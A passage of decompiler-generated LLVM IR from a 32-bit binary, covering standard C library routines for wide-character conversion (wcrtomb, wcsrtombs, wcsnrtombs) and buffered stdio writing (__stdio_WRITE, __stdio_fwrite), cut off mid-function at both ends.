  uselistorder i32 (i32, i32, i32, i32)* @wait4, { 1, 0 }
  uselistorder label %dec_label_pc_8051acd, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_805e724.259 to i32)
}

define i32 @__GI_wcrtomb() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_8051ae7 = icmp eq i32 %tmp5, 0
  %v1_8051ae9 = icmp eq i1 %v1_8051ae7, false
  br i1 %v1_8051ae9, label %dec_label_pc_8051af1, label %dec_label_pc_8051aeb

dec_label_pc_8051aeb:                             ; preds = %entry
  %v2_8051aeb = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_8051af1

dec_label_pc_8051af1:                             ; preds = %entry, %dec_label_pc_8051aeb
  %v0_8051b0d = phi i32 [ %tmp5, %entry ], [ %v2_8051aeb, %dec_label_pc_8051aeb ]
  %v0_8051af5 = phi i32 [ %tmp4, %entry ], [ 0, %dec_label_pc_8051aeb ]
  %v2_8051af1 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v0_8051af5, i32* %stack_var_-4, align 4
  store i32 %v2_8051af1, i32* %stack_var_-8, align 4
  %v2_8051b08 = ptrtoint i32* %stack_var_-8 to i32
  %v5_8051b0e = inttoptr i32 %v0_8051b0d to i8*
  %v6_8051b0e = call i32 @__GI_wcsnrtombs(i8* %v5_8051b0e, i32 %v2_8051b08, i32 1, i32 16, i32 %tmp)
  %v1_8051b16 = icmp eq i32 %v6_8051b0e, 0
  %v1_8051b18 = icmp eq i1 %v1_8051b16, false
  br i1 %v1_8051b18, label %dec_label_pc_8051b1c, label %dec_label_pc_8051b1a

dec_label_pc_8051b1a:                             ; preds = %dec_label_pc_8051af1
  %v1_8051b1a = and i32 %v6_8051b0e, -256
  %v2_8051b1a = or i32 %v1_8051b1a, 1
  br label %dec_label_pc_8051b1c

dec_label_pc_8051b1c:                             ; preds = %dec_label_pc_8051af1, %dec_label_pc_8051b1a
  %v0_8051b1f = phi i32 [ %v6_8051b0e, %dec_label_pc_8051af1 ], [ %v2_8051b1a, %dec_label_pc_8051b1a ]
  ret i32 %v0_8051b1f

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_8051b1c, { 1, 0 }
  uselistorder label %dec_label_pc_8051af1, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v5_8051b35 = inttoptr i32 %tmp to i8*
  %v6_8051b35 = call i32 @__GI_wcsnrtombs(i8* %v5_8051b35, i32 %tmp1, i32 -1, i32 %tmp2, i32 %tmp3)
  ret i32 %v6_8051b35
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8051b43 = load i32, i32* @ebx, align 4
  %v4_8051b47 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051b47, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  store i32 %arg4, i32* %eax.global-to-local, align 4
  %v1_8051b53 = icmp eq i8* %arg1, null
  br i1 %v1_8051b53, label %dec_label_pc_8051b87.thread, label %dec_label_pc_8051b57

dec_label_pc_8051b57:                             ; preds = %entry
  store i32 1, i32* %edi.global-to-local, align 4
  %v12_8051b5c = icmp eq i32 %v4_8051b47, %arg2
  %v1_8051b5e = icmp eq i1 %v12_8051b5c, false
  br i1 %v1_8051b5e, label %dec_label_pc_8051b87, label %dec_label_pc_8051b81

dec_label_pc_8051b87.thread:                      ; preds = %entry
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_8051b64 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8051b64, i32* %edx.global-to-local, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051b91

dec_label_pc_8051b6d:                             ; preds = %dec_label_pc_8051b98
  %v1_8051b6d = call i32 @__errno_location(i32 %v0_8051b43)
  store i32 %v1_8051b6d, i32* %eax.global-to-local, align 4
  %v1_8051b72 = inttoptr i32 %v1_8051b6d to i32*
  store i32 84, i32* %v1_8051b72, align 4
  br label %dec_label_pc_8051bbe

dec_label_pc_8051b7d:                             ; preds = %dec_label_pc_8051b9f
  store i32 0, i32* %esi.global-to-local, align 4
  %v0_8051bb3.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051baf

dec_label_pc_8051b81:                             ; preds = %dec_label_pc_8051b57
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_8051b83 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8051b83, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051b87

dec_label_pc_8051b87:                             ; preds = %dec_label_pc_8051b57, %dec_label_pc_8051b81
  %v2_8051b9f16 = phi i32 [ %v4_8051b47, %dec_label_pc_8051b57 ], [ %v2_8051b83, %dec_label_pc_8051b81 ]
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %tmp34 = icmp ult i32 %arg4, %arg3
  br i1 %tmp34, label %dec_label_pc_8051b8f, label %dec_label_pc_8051b91

dec_label_pc_8051b8f:                             ; preds = %dec_label_pc_8051b87
  store i32 %arg4, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051b91

dec_label_pc_8051b91:                             ; preds = %dec_label_pc_8051b87.thread, %dec_label_pc_8051b87, %dec_label_pc_8051b8f
  %v2_8051b9f1633 = phi i32 [ %v2_8051b9f16, %dec_label_pc_8051b87 ], [ %v2_8051b9f16, %dec_label_pc_8051b8f ], [ %v2_8051b64, %dec_label_pc_8051b87.thread ]
  %v0_8051b94 = phi i32 [ %arg3, %dec_label_pc_8051b87 ], [ %arg4, %dec_label_pc_8051b8f ], [ %arg3, %dec_label_pc_8051b87.thread ]
  %v1_8051b91 = inttoptr i32 %arg2 to i32*
  %v2_8051b91 = load i32, i32* %v1_8051b91, align 4
  store i32 %v2_8051b91, i32* %esi.global-to-local, align 4
  store i32 %v0_8051b94, i32* @ecx, align 4
  %v1_8051bab4 = icmp eq i32 %v0_8051b94, 0
  %v1_8051bad11 = icmp eq i1 %v1_8051bab4, false
  br i1 %v1_8051bad11, label %dec_label_pc_8051b98, label %dec_label_pc_8051baf

dec_label_pc_8051b98:                             ; preds = %dec_label_pc_8051b91, %dec_label_pc_8051ba5
  %v2_8051b9f = phi i32 [ %v2_8051ba8, %dec_label_pc_8051ba5 ], [ %v2_8051b9f1633, %dec_label_pc_8051b91 ]
  %v0_8051b98 = phi i32 [ %v1_8051ba5, %dec_label_pc_8051ba5 ], [ %v2_8051b91, %dec_label_pc_8051b91 ]
  %v1_8051b98 = inttoptr i32 %v0_8051b98 to i32*
  %v2_8051b98 = load i32, i32* %v1_8051b98, align 4
  store i32 %v2_8051b98, i32* %eax.global-to-local, align 4
  %v6_8051b9d = icmp ugt i32 %v2_8051b98, 127
  br i1 %v6_8051b9d, label %dec_label_pc_8051b6d, label %dec_label_pc_8051b9f

dec_label_pc_8051b9f:                             ; preds = %dec_label_pc_8051b98
  %v1_8051b9f = trunc i32 %v2_8051b98 to i8
  %v3_8051b9f = inttoptr i32 %v2_8051b9f to i8*
  store i8 %v1_8051b9f, i8* %v3_8051b9f, align 1
  %v0_8051ba1 = load i32, i32* %eax.global-to-local, align 4
  %v3_8051ba1 = trunc i32 %v0_8051ba1 to i8
  %v4_8051ba1 = icmp eq i8 %v3_8051ba1, 0
  br i1 %v4_8051ba1, label %dec_label_pc_8051b7d, label %dec_label_pc_8051ba5

dec_label_pc_8051ba5:                             ; preds = %dec_label_pc_8051b9f
  %v0_8051ba5 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051ba5 = add i32 %v0_8051ba5, 4
  store i32 %v1_8051ba5, i32* %esi.global-to-local, align 4
  %v0_8051ba8 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051ba8 = load i32, i32* %edi.global-to-local, align 4
  %v2_8051ba8 = add i32 %v1_8051ba8, %v0_8051ba8
  store i32 %v2_8051ba8, i32* %edx.global-to-local, align 4
  %v0_8051baa = load i32, i32* @ecx, align 4
  %v1_8051baa = add i32 %v0_8051baa, -1
  %v8_8051baa = icmp eq i32 %v1_8051baa, 0
  store i32 %v1_8051baa, i32* @ecx, align 4
  %v1_8051bad = icmp eq i1 %v8_8051baa, false
  br i1 %v1_8051bad, label %dec_label_pc_8051b98, label %dec_label_pc_8051baf

dec_label_pc_8051baf:                             ; preds = %dec_label_pc_8051ba5, %dec_label_pc_8051b91, %dec_label_pc_8051b7d
  %v0_8051bb7 = phi i32 [ 0, %dec_label_pc_8051b7d ], [ %v2_8051b91, %dec_label_pc_8051b91 ], [ %v1_8051ba5, %dec_label_pc_8051ba5 ]
  %v0_8051bb3 = phi i32 [ %v0_8051bb3.pre, %dec_label_pc_8051b7d ], [ %v2_8051b9f1633, %dec_label_pc_8051b91 ], [ %v2_8051ba8, %dec_label_pc_8051ba5 ]
  %v2_8051baf = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8051baf, i32* %eax.global-to-local, align 4
  %v12_8051bb3 = icmp eq i32 %v0_8051bb3, %v2_8051baf
  br i1 %v12_8051bb3, label %dec_label_pc_8051bba, label %dec_label_pc_8051bb7

dec_label_pc_8051bb7:                             ; preds = %dec_label_pc_8051baf
  %v1_8051bb7 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8051bb7 = inttoptr i32 %v1_8051bb7 to i32*
  store i32 %v0_8051bb7, i32* %v2_8051bb7, align 4
  br label %dec_label_pc_8051bba

dec_label_pc_8051bba:                             ; preds = %dec_label_pc_8051baf, %dec_label_pc_8051bb7
  %v0_8051bba = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8051bba, i32* %eax.global-to-local, align 4
  %v1_8051bbc = load i32, i32* @ecx, align 4
  %v2_8051bbc = sub i32 %v0_8051bba, %v1_8051bbc
  br label %dec_label_pc_8051bbe

dec_label_pc_8051bbe:                             ; preds = %dec_label_pc_8051b6d, %dec_label_pc_8051bba
  %storemerge2 = phi i32 [ %v2_8051bbc, %dec_label_pc_8051bba ], [ -1, %dec_label_pc_8051b6d ]
  store i32 %storemerge2, i32* %eax.global-to-local, align 4
  store i32 %v0_8051b43, i32* @ebx, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i32 %v2_8051ba8, { 0, 2, 1 }
  uselistorder i32 %v1_8051ba5, { 0, 2, 1 }
  uselistorder i32 %v2_8051b91, { 1, 0, 2 }
  uselistorder i32 %v0_8051b94, { 1, 0 }
  uselistorder i32 %v2_8051b9f1633, { 1, 0 }
  uselistorder i32 %v4_8051b47, { 1, 0, 2 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %edi.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 3, 0 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 3, 4, 6, 5, 7 }
  uselistorder i32 127, { 1, 0, 4, 2, 5, 3 }
  uselistorder i32 %arg4, { 2, 1, 0, 3 }
  uselistorder i32 %arg3, { 0, 1, 3, 4, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051bbe, { 1, 0 }
  uselistorder label %dec_label_pc_8051bba, { 1, 0 }
  uselistorder label %dec_label_pc_8051b98, { 1, 0 }
  uselistorder label %dec_label_pc_8051b91, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051b87, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_8051bc9 = load i32, i32* @edi, align 4
  %v0_8051bcb = load i32, i32* @ebx, align 4
  %v4_8051bcf = ptrtoint i16* %arg1 to i32
  store i32 %v4_8051bcf, i32* @edi, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v1_8051bdb5 = icmp eq i32 %arg3, 0
  br i1 %v1_8051bdb5, label %dec_label_pc_8051c3a, label %dec_label_pc_8051be0.lr.ph

dec_label_pc_8051be0.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8051be0

dec_label_pc_8051be0:                             ; preds = %dec_label_pc_8051bff.dec_label_pc_8051be0_crit_edge, %dec_label_pc_8051be0.lr.ph
  %v0_8051bf0 = phi i32 [ %v4_8051bcf, %dec_label_pc_8051be0.lr.ph ], [ %v0_8051bf0.pre, %dec_label_pc_8051bff.dec_label_pc_8051be0_crit_edge ]
  %v0_8051bef = phi i32 [ %arg2, %dec_label_pc_8051be0.lr.ph ], [ %v2_8051c01, %dec_label_pc_8051bff.dec_label_pc_8051be0_crit_edge ]
  %v0_8051be2.in = phi i32 [ %arg3, %dec_label_pc_8051be0.lr.ph ], [ %v2_8051bff, %dec_label_pc_8051bff.dec_label_pc_8051be0_crit_edge ]
  %v0_8051be2 = icmp slt i32 %v0_8051be2.in, 0
  store i32 %v0_8051be2.in, i32* %ebp.global-to-local, align 4
  %v2_8051be2 = icmp eq i1 %v0_8051be2, false
  %storemerge = select i1 %v2_8051be2, i32 %v0_8051be2.in, i32 2147483647
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8051bf0 = add i32 %v0_8051bf0, 4
  %v2_8051bf0 = inttoptr i32 %v1_8051bf0 to i32*
  %v3_8051bf0 = load i32, i32* %v2_8051bf0, align 4
  %tmp37 = inttoptr i32 %v0_8051bef to i32*
  %v5_8051bf3 = call i32 @__libc_write(i32 %v3_8051bf0, i32* %tmp37, i32 %storemerge)
  store i32 %v5_8051bf3, i32* %eax.global-to-local, align 4
  %v2_8051bfb = icmp slt i32 %v5_8051bf3, 0
  br i1 %v2_8051bfb, label %dec_label_pc_8051c05, label %dec_label_pc_8051bff

dec_label_pc_8051bff:                             ; preds = %dec_label_pc_8051be0
  %v0_8051bff = load i32, i32* @ebx, align 4
  %v2_8051bff = sub i32 %v0_8051bff, %v5_8051bf3
  %v12_8051bff = icmp eq i32 %v2_8051bff, 0
  store i32 %v2_8051bff, i32* @ebx, align 4
  %v0_8051c01 = load i32, i32* %esi.global-to-local, align 4
  %v2_8051c01 = add i32 %v0_8051c01, %v5_8051bf3
  store i32 %v2_8051c01, i32* %esi.global-to-local, align 4
  br i1 %v12_8051bff, label %dec_label_pc_8051c3a, label %dec_label_pc_8051bff.dec_label_pc_8051be0_crit_edge

dec_label_pc_8051bff.dec_label_pc_8051be0_crit_edge: ; preds = %dec_label_pc_8051bff
  %v0_8051bf0.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8051be0

dec_label_pc_8051c05:                             ; preds = %dec_label_pc_8051be0
  %v0_8051c05 = load i32, i32* @edi, align 4
  %v1_8051c05 = add i32 %v0_8051c05, 8
  %v2_8051c05 = inttoptr i32 %v1_8051c05 to i32*
  %v3_8051c05 = load i32, i32* %v2_8051c05, align 4
  store i32 %v3_8051c05, i32* @edx, align 4
  %v1_8051c08 = add i32 %v0_8051c05, 12
  %v2_8051c08 = inttoptr i32 %v1_8051c08 to i32*
  %v3_8051c08 = load i32, i32* %v2_8051c08, align 4
  store i32 %v3_8051c08, i32* %eax.global-to-local, align 4
  %v1_8051c0b = inttoptr i32 %v0_8051c05 to i16*
  %v2_8051c0b = load i16, i16* %v1_8051c0b, align 2
  %v3_8051c0b = or i16 %v2_8051c0b, 8
  store i16 %v3_8051c0b, i16* %v1_8051c0b, align 2
  %v0_8051c0f = load i32, i32* %eax.global-to-local, align 4
  %v1_8051c0f = load i32, i32* @edx, align 4
  %v2_8051c0f = sub i32 %v0_8051c0f, %v1_8051c0f
  %v12_8051c0f = icmp eq i32 %v2_8051c0f, 0
  store i32 %v2_8051c0f, i32* %eax.global-to-local, align 4
  %v4_8051c36.pre = load i32, i32* @ebx, align 4
  br i1 %v12_8051c0f, label %dec_label_pc_8051c36, label %dec_label_pc_8051c13

dec_label_pc_8051c13:                             ; preds = %dec_label_pc_8051c05
  %v6_8051c15 = icmp ugt i32 %v2_8051c0f, %v4_8051c36.pre
  br i1 %v6_8051c15, label %dec_label_pc_8051c19.preheader, label %dec_label_pc_8051c17

dec_label_pc_8051c17:                             ; preds = %dec_label_pc_8051c13
  store i32 %v2_8051c0f, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8051c19.preheader

dec_label_pc_8051c19.preheader:                   ; preds = %dec_label_pc_8051c17, %dec_label_pc_8051c13
  %v0_8051c19.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051c19

dec_label_pc_8051c19:                             ; preds = %dec_label_pc_8051c19.preheader, %dec_label_pc_8051c2b
  %v2_8051c1b = phi i32 [ %v1_8051c0f, %dec_label_pc_8051c19.preheader ], [ %v1_8051c27, %dec_label_pc_8051c2b ]
  %v4_8051c19 = phi i32 [ %v2_8051c0f, %dec_label_pc_8051c19.preheader ], [ %v0_8051c1d, %dec_label_pc_8051c2b ]
  %v0_8051c19 = phi i32 [ %v0_8051c19.pre, %dec_label_pc_8051c19.preheader ], [ %v1_8051c2b, %dec_label_pc_8051c2b ]
  %v1_8051c19 = inttoptr i32 %v0_8051c19 to i8*
  %v2_8051c19 = load i8, i8* %v1_8051c19, align 1
  %v3_8051c19 = zext i8 %v2_8051c19 to i32
  %v5_8051c19 = and i32 %v4_8051c19, -256
  %v6_8051c19 = or i32 %v3_8051c19, %v5_8051c19
  store i32 %v6_8051c19, i32* %eax.global-to-local, align 4
  %v3_8051c1b = inttoptr i32 %v2_8051c1b to i8*
  store i8 %v2_8051c19, i8* %v3_8051c1b, align 1
  %v0_8051c1d = load i32, i32* %eax.global-to-local, align 4
  %v1_8051c1d = trunc i32 %v0_8051c1d to i8
  %v10_8051c1d = icmp eq i8 %v1_8051c1d, 10
  %v1_8051c1f = icmp eq i1 %v10_8051c1d, false
  br i1 %v1_8051c1f, label %dec_label_pc_8051c27, label %dec_label_pc_8051c21

dec_label_pc_8051c21:                             ; preds = %dec_label_pc_8051c19
  %v0_8051c21 = load i32, i32* @edi, align 4
  %v1_8051c21 = add i32 %v0_8051c21, 1
  %v2_8051c21 = inttoptr i32 %v1_8051c21 to i8*
  %v3_8051c21 = load i8, i8* %v2_8051c21, align 1
  %v4_8051c21 = urem i8 %v3_8051c21, 2
  %v5_8051c21 = icmp eq i8 %v4_8051c21, 0
  %v1_8051c25 = icmp eq i1 %v5_8051c21, false
  br i1 %v1_8051c25, label %dec_label_pc_8051c21.dec_label_pc_8051c2e_crit_edge, label %dec_label_pc_8051c27

dec_label_pc_8051c21.dec_label_pc_8051c2e_crit_edge: ; preds = %dec_label_pc_8051c21
  %v0_8051c2e.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8051c2e

dec_label_pc_8051c27:                             ; preds = %dec_label_pc_8051c21, %dec_label_pc_8051c19
  %v0_8051c27 = load i32, i32* @edx, align 4
  %v1_8051c27 = add i32 %v0_8051c27, 1
  store i32 %v1_8051c27, i32* @edx, align 4
  %v0_8051c28 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8051c28 = add i32 %v0_8051c28, -1
  %v8_8051c28 = icmp eq i32 %v1_8051c28, 0
  store i32 %v1_8051c28, i32* %ebp.global-to-local, align 4
  br i1 %v8_8051c28, label %dec_label_pc_8051c27.dec_label_pc_8051c2e_crit_edge, label %dec_label_pc_8051c2b

dec_label_pc_8051c27.dec_label_pc_8051c2e_crit_edge: ; preds = %dec_label_pc_8051c27
  %v1_8051c2e.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8051c2e

dec_label_pc_8051c2b:                             ; preds = %dec_label_pc_8051c27
  %v0_8051c2b = load i32, i32* %esi.global-to-local, align 4
  %v1_8051c2b = add i32 %v0_8051c2b, 1
  store i32 %v1_8051c2b, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051c19

dec_label_pc_8051c2e:                             ; preds = %dec_label_pc_8051c27.dec_label_pc_8051c2e_crit_edge, %dec_label_pc_8051c21.dec_label_pc_8051c2e_crit_edge
  %v1_8051c2e = phi i32 [ %v0_8051c21, %dec_label_pc_8051c21.dec_label_pc_8051c2e_crit_edge ], [ %v1_8051c2e.pre, %dec_label_pc_8051c27.dec_label_pc_8051c2e_crit_edge ]
  %v0_8051c2e = phi i32 [ %v0_8051c2e.pre, %dec_label_pc_8051c21.dec_label_pc_8051c2e_crit_edge ], [ %v1_8051c27, %dec_label_pc_8051c27.dec_label_pc_8051c2e_crit_edge ]
  %v2_8051c2e = add i32 %v1_8051c2e, 16
  %v3_8051c2e = inttoptr i32 %v2_8051c2e to i32*
  store i32 %v0_8051c2e, i32* %v3_8051c2e, align 4
  %v0_8051c31 = load i32, i32* @edx, align 4
  %v1_8051c31 = load i32, i32* @edi, align 4
  %v2_8051c31 = add i32 %v1_8051c31, 8
  %v3_8051c31 = inttoptr i32 %v2_8051c31 to i32*
  %v4_8051c31 = load i32, i32* %v3_8051c31, align 4
  %v5_8051c31 = sub i32 %v0_8051c31, %v4_8051c31
  store i32 %v5_8051c31, i32* @edx, align 4
  %v0_8051c34 = load i32, i32* @ebx, align 4
  %v2_8051c34 = sub i32 %v0_8051c34, %v5_8051c31
  br label %dec_label_pc_8051c36

dec_label_pc_8051c36:                             ; preds = %dec_label_pc_8051c05, %dec_label_pc_8051c2e
  %v4_8051c36 = phi i32 [ %v2_8051c34, %dec_label_pc_8051c2e ], [ %v4_8051c36.pre, %dec_label_pc_8051c05 ]
  %v5_8051c36 = sub i32 %arg3, %v4_8051c36
  br label %dec_label_pc_8051c3a

dec_label_pc_8051c3a:                             ; preds = %dec_label_pc_8051bff, %entry, %dec_label_pc_8051c36
  %stack_var_12.0 = phi i32 [ %v5_8051c36, %dec_label_pc_8051c36 ], [ 0, %entry ], [ %arg3, %dec_label_pc_8051bff ]
  store i32 %stack_var_12.0, i32* %eax.global-to-local, align 4
  store i32 %v0_8051bcb, i32* @ebx, align 4
  store i32 %v0_8051bc9, i32* @edi, align 4
  ret i32 %stack_var_12.0

; uselistorder directives
  uselistorder i32 %stack_var_12.0, { 1, 0 }
  uselistorder i32 %v1_8051c2b, { 1, 0 }
  uselistorder i32 %v1_8051c28, { 1, 0 }
  uselistorder i32 %v1_8051c27, { 0, 2, 1 }
  uselistorder i32 %v0_8051c1d, { 1, 0 }
  uselistorder i32 %v2_8051c01, { 1, 0 }
  uselistorder i32 %v2_8051bff, { 1, 2, 0 }
  uselistorder i32 %v5_8051bf3, { 0, 2, 1, 3 }
  uselistorder i32* %esi.global-to-local, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %ebp.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32*, i32)* @__libc_write, { 2, 0, 1 }
  uselistorder i32 %arg3, { 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_8051c3a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051c36, { 1, 0 }
  uselistorder label %dec_label_pc_8051c19, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8051c48 = load i32, i32* @ebp, align 4
  %v0_8051c49 = load i32, i32* @edi, align 4
  %v0_8051c4a = load i32, i32* @esi, align 4
  %v0_8051c4b = load i32, i32* @ebx, align 4
  store i32 %v0_8051c4b, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @ebx, align 4
  store i32 %arg1, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  %v1_8051c5b = add i32 %arg3, 1
  %v2_8051c5b = inttoptr i32 %v1_8051c5b to i8*
  %v3_8051c5b = load i8, i8* %v2_8051c5b, align 1
  %v4_8051c5b = and i8 %v3_8051c5b, 2
  %v5_8051c5b = icmp eq i8 %v4_8051c5b, 0
  %v1_8051c5f = icmp eq i1 %v5_8051c5b, false
  br i1 %v1_8051c5f, label %dec_label_pc_8051d16, label %dec_label_pc_8051c65

dec_label_pc_8051c65:                             ; preds = %entry
  %v1_8051c65 = add i32 %arg3, 4
  %v2_8051c65 = inttoptr i32 %v1_8051c65 to i32*
  %v3_8051c65 = load i32, i32* %v2_8051c65, align 4
  %v13_8051c65 = icmp eq i32 %v3_8051c65, -2
  %v1_8051c69 = add i32 %arg3, 16
  %v2_8051c69 = inttoptr i32 %v1_8051c69 to i32*
  %v3_8051c69 = load i32, i32* %v2_8051c69, align 4
  store i32 %v3_8051c69, i32* @edx, align 4
  %v1_8051c6c = add i32 %arg3, 12
  %v2_8051c6c = inttoptr i32 %v1_8051c6c to i32*
  %v3_8051c6c = load i32, i32* %v2_8051c6c, align 4
  %v1_8051c6f = icmp eq i1 %v13_8051c65, false
  %v2_8051c8f = sub i32 %v3_8051c6c, %v3_8051c69
  store i32 %v2_8051c8f, i32* %eax.global-to-local, align 4
  br i1 %v1_8051c6f, label %dec_label_pc_8051c8f, label %dec_label_pc_8051c71

dec_label_pc_8051c71:                             ; preds = %dec_label_pc_8051c65
  %tmp22 = icmp ult i32 %v2_8051c8f, %arg2
  br i1 %tmp22, label %dec_label_pc_8051c79, label %dec_label_pc_8051c7b

dec_label_pc_8051c79:                             ; preds = %dec_label_pc_8051c71
  br label %dec_label_pc_8051c7b

dec_label_pc_8051c7b:                             ; preds = %dec_label_pc_8051c71, %dec_label_pc_8051c79
  %storemerge = phi i32 [ %v2_8051c8f, %dec_label_pc_8051c79 ], [ %arg2, %dec_label_pc_8051c71 ]
  %v0_8051c7c = phi i32 [ %v2_8051c8f, %dec_label_pc_8051c79 ], [ %arg2, %dec_label_pc_8051c71 ]
  store i32 %storemerge, i32* @esi, align 4
  %v3_8051c7f = inttoptr i32 %v3_8051c69 to i16*
  %v4_8051c7f = call i32 @memcpy(i16* %v3_8051c7f, i32 %v0_8051c7c, i32 %v2_8051c8f)
  store i32 %v4_8051c7f, i32* %eax.global-to-local, align 4
  %v0_8051c84 = load i32, i32* @ebx, align 4
  %v1_8051c84 = add i32 %v0_8051c84, 16
  %v2_8051c84 = inttoptr i32 %v1_8051c84 to i32*
  %v3_8051c84 = load i32, i32* %v2_8051c84, align 4
  %v4_8051c84 = load i32, i32* @esi, align 4
  %v5_8051c84 = add i32 %v4_8051c84, %v3_8051c84
  store i32 %v5_8051c84, i32* %v2_8051c84, align 4
  br label %dec_label_pc_8051d2e

dec_label_pc_8051c8f:                             ; preds = %dec_label_pc_8051c65
  %v6_8051c93 = icmp ult i32 %v2_8051c8f, %arg2
  br i1 %v6_8051c93, label %dec_label_pc_8051cfd, label %dec_label_pc_8051c95

dec_label_pc_8051c95:                             ; preds = %dec_label_pc_8051c8f
  %v0_8051c95 = load i32, i32* @ecx, align 4
  %v3_8051c99 = inttoptr i32 %v3_8051c69 to i16*
  %v4_8051c99 = call i32 @memcpy(i16* %v3_8051c99, i32 %arg2, i32 %v0_8051c95)
  store i32 %v4_8051c99, i32* %eax.global-to-local, align 4
  %v0_8051c9e = load i32, i32* @ebx, align 4
  %v1_8051c9e = add i32 %v0_8051c9e, 16
  %v2_8051c9e = inttoptr i32 %v1_8051c9e to i32*
  %v3_8051c9e = load i32, i32* %v2_8051c9e, align 4
  %v4_8051c9e = load i32, i32* @edi, align 4
  %v5_8051c9e = add i32 %v4_8051c9e, %v3_8051c9e
  store i32 %v5_8051c9e, i32* %v2_8051c9e, align 4
  %v0_8051ca4 = load i32, i32* @ebx, align 4
  %v1_8051ca4 = add i32 %v0_8051ca4, 1
  %v2_8051ca4 = inttoptr i32 %v1_8051ca4 to i8*
  %v3_8051ca4 = load i8, i8* %v2_8051ca4, align 1
  %v4_8051ca4 = urem i8 %v3_8051ca4, 2
  %v5_8051ca4 = icmp eq i8 %v4_8051ca4, 0
  br i1 %v5_8051ca4, label %dec_label_pc_8051d2e, label %dec_label_pc_8051cae

dec_label_pc_8051cae:                             ; preds = %dec_label_pc_8051c95
  %v0_8051cae = load i32, i32* @edx, align 4
  %v0_8051caf = load i32, i32* @edi, align 4
  %v4_8051cb3 = call i32 @memrchr(i8 10, i32 %v0_8051caf, i32 %v0_8051cae)
  store i32 %v4_8051cb3, i32* %eax.global-to-local, align 4
  %v1_8051cbb = icmp eq i32 %v4_8051cb3, 0
  br i1 %v1_8051cbb, label %dec_label_pc_8051d2e, label %dec_label_pc_8051cbf

dec_label_pc_8051cbf:                             ; preds = %dec_label_pc_8051cae
  %v0_8051cc2 = load i32, i32* @ebx, align 4
  %v1_8051cc3 = call i32 @__stdio_wcommit(i32 %v0_8051cc2)
